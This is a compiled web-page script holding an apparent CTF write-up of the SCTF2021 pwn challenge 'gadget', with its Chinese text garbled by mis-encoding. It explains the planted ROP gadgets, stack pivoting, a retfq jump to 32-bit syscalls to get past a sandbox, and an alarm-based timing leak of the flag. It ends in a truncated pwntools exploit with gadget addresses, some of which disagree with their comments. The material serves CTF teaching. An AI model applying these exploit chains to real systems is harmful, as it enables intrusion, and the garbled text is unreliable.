(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{507:function(s,t,a){"use strict";a.r(t);var n=a(31),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"sctf2021-pwn-gadget-å‡ºé¢˜æ€è·¯-é¢„æœŸéžé¢„æœŸè§£"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sctf2021-pwn-gadget-å‡ºé¢˜æ€è·¯-é¢„æœŸéžé¢„æœŸè§£"}},[s._v("#")]),s._v(" SCTF2021 pwn gadget å‡ºé¢˜æ€è·¯+é¢„æœŸéžé¢„æœŸè§£")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://lingze.xyz/pages/6d05cb/",target:"_blank",rel:"noopener noreferrer"}},[s._v("sctf2021 pwnå‡ºé¢˜æ€è·¯"),a("OutboundLink")],1)]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#ç¼–è¯‘çŽ¯å¢ƒ"}},[s._v("ç¼–è¯‘çŽ¯å¢ƒ")])]),a("li",[a("a",{attrs:{href:"#oraæ€è·¯"}},[s._v("oraæ€è·¯")])]),a("li",[a("a",{attrs:{href:"#gadget"}},[s._v("gadget")]),a("ul",[a("li",[a("a",{attrs:{href:"#å‡ºé¢˜è€ƒç‚¹"}},[s._v("å‡ºé¢˜è€ƒç‚¹")])]),a("li",[a("a",{attrs:{href:"#æ ˆè¿ç§»"}},[s._v("æ ˆè¿ç§»")])]),a("li",[a("a",{attrs:{href:"#mov-rdx"}},[s._v("mov rdx")])])])]),a("li",[a("a",{attrs:{href:"#æ—¶é—´çˆ†ç ´"}},[s._v("æ—¶é—´çˆ†ç ´")]),a("ul",[a("li",[a("a",{attrs:{href:"#alarm"}},[s._v("alarm")])]),a("li",[a("a",{attrs:{href:"#sub-rcx-esi"}},[s._v("sub [rcx], esi;")])]),a("li",[a("a",{attrs:{href:"#libc-exit-fini"}},[s._v("libcexitfini")])]),a("li",[a("a",{attrs:{href:"#sub-jz-æ‹¼å‡‘"}},[s._v("sub+jz æ‹¼å‡‘")])])])]),a("li",[a("a",{attrs:{href:"#exp"}},[s._v("exp")])])])]),a("p"),s._v(" "),a("p",[s._v("å‡ºé¢˜æ€è·¯å…¶å®žæ¥è‡ª"),a("a",{attrs:{href:"https://lingze.xyz/pages/ea4dff/",target:"_blank",rel:"noopener noreferrer"}},[s._v("è¿™ä¸ªé¢˜ç›®"),a("OutboundLink")],1),s._v("ï¼Œéžå¸¸è§„çš„gadgetæ‹¼å‡‘ï¼Œ")]),s._v(" "),a("h2",{attrs:{id:"ç¼–è¯‘çŽ¯å¢ƒ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç¼–è¯‘çŽ¯å¢ƒ"}},[s._v("#")]),s._v(" ç¼–è¯‘çŽ¯å¢ƒ")]),s._v(" "),a("p",[s._v("è¿™ä¸ªé¢˜ç›®çš„ç¼–è¯‘çŽ¯å¢ƒæ˜¯ollvmç¼–è¯‘å‡ºçš„musl libcï¼Œ ç„¶åŽä½¿ç”¨è¿™ä¸ªmuslåŽ»é™æ€ç¼–è¯‘å‡ºæ–‡ä»¶æ¥ã€‚ä»Žè€Œå¾—åˆ°çš„æ–‡ä»¶ä¸­çš„gadgetå°±å¾ˆå°‘è§äº†ã€‚")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/m4PVCEkhUFo3jOd.png",alt:"image-20211112202707893"}})]),s._v(" "),a("h2",{attrs:{id:"oraæ€è·¯"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#oraæ€è·¯"}},[s._v("#")]),s._v(" oraæ€è·¯")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/RpgawNKQUcSYTs6.png",alt:"image-20211112202551950"}})]),s._v(" "),a("p",[s._v("çœ‹åˆ°æ²™ç›’åº”è¯¥å°±æœ‰å¯¹åº”çš„æ€è·¯äº†ï¼Œå…ˆä½¿ç”¨retfqè·³åˆ°32ä½ä½¿ç”¨openï¼Œ ç„¶åŽå›žåˆ°64ä½ä½¿ç”¨readï¼Œ æœ€åŽé€šè¿‡alarmå¾—åˆ°flagï¼Œ")]),s._v(" "),a("p",[s._v("è¿™åº”è¯¥æ˜¯shellcodeé¢˜ç›®å¸¸è§çš„æ€è·¯ï¼Œ")]),s._v(" "),a("h2",{attrs:{id:"gadget"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#gadget"}},[s._v("#")]),s._v(" gadget")]),s._v(" "),a("p",[s._v("è¿™é‡Œç›¸å…³çš„gadgetéƒ½é€šè¿‡å†…è”æ±‡ç¼–æˆ–è€…èµ‹å€¼è¯­å¥æ”¾åœ¨ç¨‹åºå†…äº†ï¼Œç”¨ropperæŸ¥æ‰¾åº”è¯¥ä¼šæ¯”ROPgadgetæ•ˆæžœå¥½ä¸€äº›äº›ã€‚")]),s._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[s._v("    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// pop rcx; retn;")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xc359")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// jmp $ ")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" b "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xfeeb")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// retfq")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xcb48")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// int 80; retn;")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" b "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xc380cd")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("asm")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("volatile")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"movb (%rsi, %rax), %bl\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mov %rbx, %rdi\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"push %r14\\n\\t"')]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ret\\n\\t"')]),s._v("\n     "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("h3",{attrs:{id:"å‡ºé¢˜è€ƒç‚¹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å‡ºé¢˜è€ƒç‚¹"}},[s._v("#")]),s._v(" å‡ºé¢˜è€ƒç‚¹")]),s._v(" "),a("p",[s._v("å…¶å®žä¸ªäººå¯¹äºŽgadgetçš„ç†è§£æ˜¯è¿™æ ·çš„ï¼š")]),s._v(" "),a("p",[s._v("ä¸€å°æ®µä»£ç ï¼Œå®ƒçš„ç»“æž„å¤§æ¦‚æ˜¯å¦‚æ­¤: "),a("code",[s._v("[åŠŸèƒ½][å‰¯ä½œç”¨][å†æ¬¡æŽ§åˆ¶]")]),s._v("ï¼Œ")]),s._v(" "),a("p",[s._v("è¿™ä¸ªåŠŸèƒ½æ˜¯æˆ‘ä»¬æƒ³è¦è®©ä»–è¿è¡Œçš„ä»£ç ã€‚")]),s._v(" "),a("p",[s._v("å‰¯ä½œç”¨å³ æˆ‘ä»¬è¿è¡Œè¿™ä¸ªgadgetå¿…å®šä¼šå‘ä¸‹è¿è¡Œï¼Œå¿…é¡»è¦è®©ä»–æ»¡è¶³çš„ä¸€äº›æŒ‡ä»¤ï¼Œæˆ–è€…ä¼šå¹²æ‰°æˆ‘ä»¬åˆ©ç”¨çš„ä¸€äº›æ“ä½œä¹Ÿè¦åŽ»å¤„ç†æŽ‰ã€‚")]),s._v(" "),a("p",[s._v("å†æ¬¡æŽ§åˆ¶å¯ä»¥æ˜¯retï¼Œ æˆ–è€…call/jmpæŸä¸ªå¯„å­˜å™¨ï¼Œéƒ½æ˜¯okçš„ï¼Œ")]),s._v(" "),a("p",[s._v("äºŽæ˜¯è®¾è®¡é¢˜ç›®çš„æ—¶å€™å¤šæ¬¡ä½¿ç”¨äº†ä¸€äº›å¾ˆä¸å¸¸è§„çš„gadgetï¼Œ å¯æƒœå‡ºé¢˜æœ‰äº›ä»“ä¿ƒä¹Ÿæ²¡æ€Žä¹ˆæµ‹è¯•é¢˜ç›®ï¼Œå¯¼è‡´ä¸€äº›ä½ç½®æ²¡å¤„ç†å¥½ï¼Œè¿™å‡ ä¸ªé‡è¦çš„ä½ç½®ä¹Ÿæœ‰æŒºå¤šéžé¢„æœŸï¼Œä¹Ÿå°±ç›´æŽ¥å…¬å¸ƒè¿™ä¸ªé¢˜è§£å¤§ä¼™çœ‹çœ‹å§ã€‚")]),s._v(" "),a("h3",{attrs:{id:"æ ˆè¿ç§»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ ˆè¿ç§»"}},[s._v("#")]),s._v(" æ ˆè¿ç§»")]),s._v(" "),a("p",[s._v("åŽŸæœ¬æ€è·¯æ˜¯é€šè¿‡leaveæ ˆè¿ç§»ï¼Œ")]),s._v(" "),a("blockquote",[a("p",[s._v("å…¶å®žè¿™ä¸ªç¬¬ä¸€æ¡å®Œå…¨å¯ç”¨ï¼Œè€Œä¸”æ¯”ç¬¬ä¸€æ¡è¿˜çŸ­ã€‚ðŸ§")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/VAOEFwbgzYXvopI.png",alt:"image-20211112204517189"}})]),s._v(" "),a("p",[s._v("é‚£ä¹ˆè¿™é‡Œæœ‰ä¸€ä¸ªé•¿åº¦é™åˆ¶ï¼Œä½¿ç”¨"),a("code",[s._v("pop rdi, jmp rax;")]),s._v("ä¼šæ¯”"),a("code",[s._v("pop rdi; pop rap; ret")]),s._v("å°‘ä¸€ä¸ªå­—èŠ‚ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/aK1pwkNObcFLfsM.png",alt:"image-20211112203428200"}})]),s._v(" "),a("p",[s._v("å¹¶ä¸”åœ¨mainå‡½æ•°è¿”å›žçš„æ—¶å€™å·²ç»è®¾ç½®å¥½äº†è¿™ä¸ªraxçš„å€¼")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/wHzkxYv2j3fnL5p.png",alt:"image-20211112203553814"}})]),s._v(" "),a("p",[s._v("çœ‹åˆ°wpå¾ˆå¤šå¸ˆå‚…é€šè¿‡pop rspè¿›è¡Œæ ˆè¿ç§»äº†ï¼Œè¿™ä¸ªåœ¨å‡ºé¢˜çš„æ—¶å€™ç¡®å®žæ²¡æœ‰è€ƒè™‘åˆ°ï¼Œè¿™ä¸ªæ–¹æ¡ˆå¯ä»¥æ›´ç®€å•ä¸€äº›ã€‚")]),s._v(" "),a("h3",{attrs:{id:"mov-rdx"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mov-rdx"}},[s._v("#")]),s._v(" mov rdx")]),s._v(" "),a("p",[s._v("åœ¨gadgetä¸­å…¶å®žæ˜¯æ²¡æœ‰å¯ç”¨çš„"),a("code",[s._v("pop rdx")]),s._v("ç›¸å…³çš„ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/pu7C4XxWrbVJE8g.png",alt:"image-20211112204006171"}})]),s._v(" "),a("blockquote",[a("p",[s._v("è¿™ä¸ªæœ€åŽçš„ "),a("code",[s._v("ret 0xfdbf;")]),s._v("ä¼šè®©æ ˆé™ä½Ž 0xfdbfä¸ªå¤§å°ï¼Œä¸å¯æŽ§")])]),s._v(" "),a("p",[s._v("ä½†æ˜¯æœ‰ä¸ªè¿™æ ·çš„gadgetè·¯çº¿")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/JtPZqQO8ilGkEMj.png",alt:"image-20211112204105740"}})]),s._v(" "),a("p",[s._v("æ³¨æ„è¿™ä¸ª "),a("code",[s._v("mov rdx, r12; call r14;")]),s._v("ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/Oy6nKwGFizVC7R4.png",alt:"image-20211112204114078"}})]),s._v(" "),a("p",[s._v("è¿™ä¸¤ä¸ªå¯„å­˜å™¨æˆ‘ä»¬éƒ½å¯ä»¥æŽ§åˆ¶ï¼ŒäºŽæ˜¯å¯ä»¥å€ŸåŠ©è¿™ä¸ªæŽ§åˆ¶rdxï¼Œ")]),s._v(" "),a("p",[s._v("åŒæ—¶ï¼Œç”±äºŽæ˜¯"),a("code",[s._v("call r14")]),s._v("ï¼Œ ä¼šæœ‰è¿”å›žåœ°å€åŽ‹æ ˆï¼Œ äºŽæ˜¯æˆ‘ä»¬å°†r14è®¾ç½®åˆ°ä¸€ä¸ªéšæ„ä¸€ä¸ª"),a("code",[s._v("pop ;ret")]),s._v("çš„ç»“æž„å³å¯ã€‚")]),s._v(" "),a("p",[s._v("ä½†æ˜¯å‡ºé¢˜ä»ç„¶æ²¡å¤„ç†å¥½è¿™ä¸ªä½ç½®ï¼Œä¸»è¦ä¸€å¼€å§‹å¯¹äºŽollvmä¸å¤ªç†Ÿï¼Œä¼šæŠŠè¿™ä¸ªä½ç½®æ··æ·†äº†ï¼ŒäºŽæ˜¯å°±å§å‚æ•°å…¨è®¾ç½®åˆ°readå†…äº†ï¼ŒåŽæ¥ç”¨äº†"),a("code",[s._v("__attribute")]),s._v("ä½†æ˜¯å¿˜äº†æ”¹å›žæ¥ï¼Œè¿™æ ·å°±æä¾›äº†å¯ä»¥ç›´æŽ¥è·³è¿‡æ¥ä¸æŽ§åˆ¶rdxçš„æ–¹æ¡ˆï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/YPoigtFuK8mRfAs.png",alt:"image-20211112210115902"}})]),s._v(" "),a("p",[s._v("è€Œä¸”ä¸€ç›´åˆ°æ”¾é¢˜ç›®ä¹Ÿæ²¡æœ‰å†æ³¨æ„åˆ°è¿™ä¸ªç‚¹ï¼Œæ‰€ä»¥è¿™ä¸ªä½ç½®å…¶å®žå‡ºç®€å•äº† qaq")]),s._v(" "),a("h2",{attrs:{id:"æ—¶é—´çˆ†ç ´"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#æ—¶é—´çˆ†ç ´"}},[s._v("#")]),s._v(" æ—¶é—´çˆ†ç ´")]),s._v(" "),a("h3",{attrs:{id:"alarm"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#alarm"}},[s._v("#")]),s._v(" alarm")]),s._v(" "),a("p",[s._v("å…¶å®žè¿™ä¸ªä½ç½®é¢„æœŸå°±æ˜¯oraå˜›ï¼Œä½¿ç”¨alarmå³å¯ï¼Œè¿™é‡Œç»™äº†ä¸ªgadgetç”¨æ¥å–å‡ºflagæ¯ä¸€ä½ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/skQcNqREtIgf6vi.png",alt:"image-20211112210737186"}})]),s._v(" "),a("p",[s._v("ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯bl, ä¸‹é¢ä¼ é€’æ˜¯rbx, éœ€è¦æå‰æ¸…ç†æŽ‰rbxä¸­çš„æ•°æ®ï¼Œä¸ç„¶è¿˜æ˜¯gï¼Œ")]),s._v(" "),a("h3",{attrs:{id:"sub-rcx-esi"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sub-rcx-esi"}},[s._v("#")]),s._v(" sub [rcx], esi;")]),s._v(" "),a("p",[s._v("ä½†æ˜¯nebulaçš„å¸ˆå‚…æ‰¾åˆ°äº†å…¶ä»–gadgetï¼Œ å¤ªçŒ›äº†ï¼")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/CapqI3MRF5YiHBQ.png",alt:"image-20211112210531054"}})]),s._v(" "),a("blockquote",[a("p",[s._v("è¿™ä¸ªgadgetè¿˜æ˜¯åœ¨é™æ€ç¼–è¯‘çš„åº“å‡½æ•°ä¸­çš„ï¼Œç¡®å®žçŒ›ï¼Œ")])]),s._v(" "),a("h3",{attrs:{id:"libc-exit-fini"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#libc-exit-fini"}},[s._v("#")]),s._v(" libc_exit_fini")]),s._v(" "),a("p",[s._v("å¦ä¸€ä¸ªæ€è·¯æ˜¯Dest0g3çš„å¸ˆå‚…ï¼Œè¿™ä¸ªä½ç½®æ˜¯exitå‡½æ•°ä¸­è¿›è¡Œæ•°æ®æ¯”è¾ƒçš„ä½ç½®ï¼ŒæŽ§åˆ¶rspæŒ‡å‘æˆ‘ä»¬çš„flagï¼Œ ç„¶åŽè¿™ä¸ªå–å€¼å’Œæ¯”è¾ƒä¼šå–åˆ°æˆ‘ä»¬çš„flagï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/jCBYpAXb1FcdyGU.png",alt:"image-20211112211458215"}})]),s._v(" "),a("p",[s._v("è¿™ä¸ªä½ç½®çš„æ¯”è¾ƒä¼šå¹²æ‰°åˆ°æ•´ä¸ªç¨‹åºæ˜¯å¦é€€å‡ºï¼ŒäºŽæ˜¯å¦‚æžœæ¯”è¾ƒæˆåŠŸï¼Œé‚£ä¹ˆç¨‹åºä¼šè¿›å…¥æ­»å¾ªçŽ¯ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/xNOMm47pC13qWZR.png",alt:"image-20220102212151438"}})]),s._v(" "),a("h3",{attrs:{id:"sub-jz-æ‹¼å‡‘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sub-jz-æ‹¼å‡‘"}},[s._v("#")]),s._v(" sub+jz æ‹¼å‡‘")]),s._v(" "),a("p",[s._v("r4kpigçš„å¸ˆå‚…ä»¬é‡‡ç”¨äº†å¦ä¸€å¥—æ–¹æ¡ˆæ‹¼å‡‘èµ·æ¥sub + jzçš„è·³è½¬ï¼Œ")]),s._v(" "),a("p",[s._v("å…ˆè¿è¡Œè¿™ä¸ªä½ç½®æ¯”è¾ƒä¸¤ä¸ªæ•°æ®ï¼Œè¿™ä¸€æ­¥ä¼šè®¾ç½®eflagå¯„å­˜å™¨ï¼Œä¸‹é¢å¯ä»¥ç›´æŽ¥ä½¿ç”¨jzåˆ¤æ–­æ˜¯å¦ä½0ï¼Œ å³ä¸¤ä¸ªæ•°å€¼æ˜¯å¦ç›¸ç­‰ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/pvXBCw8deRPuMo5.png",alt:"image-20220102213510620"}})]),s._v(" "),a("p",[s._v("è€ŒåŽæ‰¾åˆ°ä¸€ä¸ªjzçš„ä½ç½®ï¼Œ ä¸¤æ¡è·¯ä¸ä¸€è‡´ï¼Œä¸€ä¸ªè·³å‘rax, ä¸€ä¸ªç›´æŽ¥ret, äºŽæ˜¯æŽ§åˆ¶ä¸€ä¸ªä¸ºexitä¸€ä¸ªä¸º"),a("code",[s._v("jmp $")]),s._v("(loop)å³å¯ï¼Œ")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s2.loli.net/2022/01/02/xid6VtSEcuKzRN5.png",alt:"image-20220102213933015"}})]),s._v(" "),a("h2",{attrs:{id:"exp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[s._v("#")]),s._v(" exp")]),s._v(" "),a("p",[s._v("è¿™é‡Œexpæ˜¯æˆ‘çš„æ€è·¯ã€‚")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" \n\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("terminal "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'tmux'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'splitw'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\ncmd "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v("'''\nb * 0x0000000000401222\nb * 0x0000000000408865\nb * 0x00000000004011f3\n'''")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# pop rdi; jmp rax; ")]),s._v("\npoprdi_jmprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402be4")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  pop rdi; pop rbp; ret;")]),s._v("\npoprdi_poprbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401734")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rsi; pop r15; jmp rax;")]),s._v("\npoprsi_1_jmprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402be2")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rsi; pop r15; pop rbp; ret;")]),s._v("\npoprsi_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401732")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : mov rdx, r12; call r14;")]),s._v("\nmovrdx_callr14 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000402c07")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop r12; pop r14; pop r15; pop rbp; ret;")]),s._v("\npopr12_popr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000040172f")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rax; ret;")]),s._v("\npoprax "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401001")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop rbp; ret;")]),s._v("\npoprbp_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401102")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : syscall; ret;")]),s._v("\nsyscall_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000408865")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : leave; mov qword ptr [rdi + rdx - 0x2f], rax; mov qword ptr [rdi + rdx - 0x27], rax; mov rax, rdi; ret; ")]),s._v("\nleave "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000403be5")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : leave; mov dword ptr [rbp - 0x40], eax; mov eax, ecx; add rsp, 0x40; pop rbp; ret; ")]),s._v("\nleave2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401224")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : ret; ")]),s._v("\nret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401002")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : int 0x80; ret; ")]),s._v("\nint80 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011f3")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# .text:retfq")]),s._v("\nretfq "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011EC")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0x0000000000402cf5: pop rbx; pop r14; pop r15; pop rbp; ret; ")]),s._v("\npoprbx_popr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000403072")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0x000000000040115b: pop rcx; ret;")]),s._v("\npoprcx "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000040117b")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  mov bl, [rsi+rax];mov rdi, rbx;push r14;retn; ")]),s._v("\nmovrdi "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011BE")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# : pop r14; pop r15; pop rbp; ret;")]),s._v("\npopr14_2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0000000000401731")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 000000000040119A: jmp $")]),s._v("\nloop "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000004011BA")]),s._v("\n\nbss "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x00000000040D160")]),s._v("\nptr 